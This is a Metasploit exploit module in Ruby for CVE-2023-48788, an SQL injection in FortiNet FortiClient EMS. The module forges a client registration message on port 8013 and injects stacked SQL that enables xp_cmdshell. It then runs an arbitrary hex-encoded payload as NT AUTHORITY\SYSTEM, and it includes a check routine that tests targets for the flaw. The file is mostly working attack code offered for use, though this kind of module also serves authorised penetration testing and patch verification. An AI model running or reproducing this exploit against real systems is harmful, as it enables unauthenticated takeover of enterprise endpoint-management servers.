##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::Tcp
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'FortiNet FortiClient Endpoint Management Server FCTID SQLi to RCE',
        'Description' => %q{
          An SQLi injection vulnerability exists in FortiNet FortiClient EMS (Endpoint Management Server).
          FortiClient EMS serves as an endpoint management solution tailored for enterprises, offering a centralized
          platform for overseeing enrolled endpoints. The SQLi is vulnerability is due to user controller strings which
          can be sent directly into database queries.

          FcmDaemon.exe is the main service responsible for communicating with enrolled clients. By default it listens on port 8013
          and communicates with FCTDas.exe which is responsible for translating requests and sending them to the database.
          In the message header of a specific request sent between the two services, the FCTUID parameter is vulnerable
          SQLi. The SQLi can used to enable the xp_cmdshell which can then be used to obtain unauthenticated remote code
          execution in the context of NT AUTHORITY\SYSTEM

          Affected versions of FortiClient EMS include:
          7.2.0 through 7.2.2
          7.0.1 through 7.0.10

          Upgrading to either 7.2.3, 7.0.11 or above is recommended by FortiNet.

          It should be noted that in order to be vulnerable, at least one endpoint needs to be enrolled / managed by FortiClient
          EMS for the necessary vulnerable services to be available.
        },
        'Author' => [
          'Zach Hanley',     # Analysis & PoC
          'James Horseman',  # Analysis & PoC
          'jheysel-r7',      # Msf module
          'Spencer McIntyre' # Msf module assistance
        ],
        'References' => [
          [ 'URL', 'https://www.horizon3.ai/attack-research/attack-blogs/cve-2023-48788-fortinet-forticlientems-sql-injection-deep-dive/'],
          [ 'URL', 'https://github.com/horizon3ai/CVE-2023-48788/blob/main/CVE-2023-48788.py'],
          [ 'CVE', '2023-48788']
        ],
        'License' => MSF_LICENSE,
        'Platform' => 'win',
        'Privileged' => true,
        'Arch' => [ ARCH_CMD ],
        'Targets' => [
          [ 'Automatic Target', {}]
        ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2024-04-21',
        'DefaultOptions' => {
          'SSL' => true,
          'RPORT' => 8013
        },
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'SideEffects' => [ IOC_IN_LOGS ],
          'Reliability' => [ REPEATABLE_SESSION ]
        }
      )
    )
  end

  def get_register_info
    register_info = <<~REGISTER_INFO
      AVSIG_VER=1.00000
      REG_KEY=_
      EP_ONNETCHKSUM=0
      AVENG_VER=6.00266
      DHCP_SERVER=None
      FCTOS=WIN64
      VULSIG_VER=1.00000
      FCTVER=7.0.7.0345
      APPSIG_VER=13.00364
      USER=Administrator
      APPENG_VER=4.00082
      AVALSIG_VER=0.00000
      VULENG_VER=2.00032
      OSVER=Microsoft Windows Server 2019 , 64-bit (build 17763)
      COM_MODEL=VMware Virtual Platform
      RSENG_VER=1.00020
      AV_PROTECTED=0
      AVALENG_VER=0.00000
      PEER_IP=
      ENABLED_FEATURE_BITMAP=49
      EP_OFFNETCHKSUM=0
      INSTALLED_FEATURE_BITMAP=158583
      EP_CHKSUM=0
      HIDDEN_FEATURE_BITMAP=155943
      DISKENC=
      HOSTNAME=CYBER-RETQB1FLP
      AV_PRODUCT=
      FCT_SN=FCT8001638848651
      INSTALLUID=#{Faker::Internet.uuid.upcase}
      NWIFS=Ethernet0|#{Faker::Internet.ip_v4_address}|#{Faker::Internet.mac_address}|#{Faker::Internet.ip_v4_address}|#{Faker::Internet.mac_address}|1|*|0
      UTC=1710271774
      PC_DOMAIN=
      COM_MAN=VMware, Inc.
      CPU=Intel(R) Xeon(R) Silver 4215 CPU @ 2.50GHz
      MEM=12287
      HDD=99
      COM_SN=VMware-42 04 ed 2d 64 e8 0b 14-45 e9 e4 f6 5a c7 67 82
      DOMAIN=
      WORKGROUP=WORKGROUP
      USER_SID=S-1-5-21-#{rand(9) * 10}-#{rand(9) * 10}-#{rand(9) * 10}-500
      GROUP_TAG=
      ADGUID=
      EP_FGTCHKSUM=0
      EP_RULECHKSUM=0
      WF_FILESCHKSUM=0
      EP_APPCTRLCHKSUM=0
    REGISTER_INFO
    Rex::Text.encode_base64(register_info)
  end

  def get_message(sqli)
    message = "MSG_HEADER: FCTUID=CBE8FC122B1A46D18C3541E1A8EFF7BD{SQLI_PLACEHOLDER}\n"
    message << "IP=127.0.0.1\n"
    message << "MAC=#{Faker::Internet.mac_address}\n"
    message << "FCT_ONNET=0\n"
    message << "CAPS=32767\n"
    message << "VDOM=default\n"
    message << "EC_QUARANTINED=0\n"
    message << "SIZE=    {SIZE_PLACEHOLDER}\n"
    message << "\n"
    message << "X-FCCK-REGISTER: SYSINFO||#{get_register_info}\n"
    message << 'X-FCCK-REGISTER-END'
    message << "\r\n"
    message << "\r\n"
    message.gsub!('{SQLI_PLACEHOLDER}', sqli)
    message_length = message.length
    message_length = message_length - '{SIZE_PLACEHOLDER}'.length + message_length.to_s.length
    message.gsub!('{SIZE_PLACEHOLDER}', message_length.to_s)
    message
  end

  def send_message(sqli)
    message = get_message(sqli)
    vprint_status("Sending the following message: #{message}")

    buf = ''
    begin
      connect(true, { 'SSL' => true })
      sock.put(message)
      buf = sock.get_once || ''
    rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e
      elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
    ensure
      disconnect
    end
    vprint_status("The response received was: #{buf}")
    buf
  end

  def check
    res = send_message("' OR 1=1; --")
    return CheckCode::Vulnerable('The SQLi has been exploited successfully') if res.include?('KA_INTERVAL')
    return CheckCode::Safe if res.include?("The FCT record doesn't exist")

    CheckCode::Unknown("#{peer} - FmcDaemon.exe does not appear to be running on the endpoint targeted")
  end

  def exploit
    # Things to note:
    # 1. xp_cmdshell is disabled by default so first we must enable it.
    # 2. The application takes the SQL statement we inject into and converts it all to upper case. This was causing
    # attempted Base64 encoded payloads to fail, and is why we send the payload has a hex string and decode it using SQL
    # before running the command with xp_command shell.
    # 3. We expect to see KA_INTERVAL in the response to every SQLi attempt except for when we deliver the payload which
    # is when we expect the response to be empty.
    inject = [
      "' OR 1=1; exec master.dbo.sp_configure 'show advanced options', 1;--",
      "' OR 1=1; reconfigure;--",
      "' OR 1=1; exec master.dbo.sp_configure 'xp_cmdshell',1;--",
      "' OR 1=1; reconfigure;--",
      "' OR 1=1; DECLARE @SQL VARCHAR(#{payload.encoded.length}) = CONVERT(VARCHAR(MAX), 0X#{payload.encoded.unpack('H*').first}); exec master.dbo.xp_cmdshell @sql;--",
    ]
    inject.each do |sqli|
      if sqli == inject.last
        send_message(sqli).empty? ? print_good("The SQLi: #{sqli} was executed successfully") : fail_with(Failure::UnexpectedReply, 'The SQLi injection response indicated the injection was unsuccessful.')
      else
        send_message(sqli).include?('KA_INTERVAL') ? print_good("The SQLi: #{sqli} was executed successfully") : fail_with(Failure::UnexpectedReply, 'The SQLi injection response indicated the injection was unsuccessful.')
      end
    end
  end
end
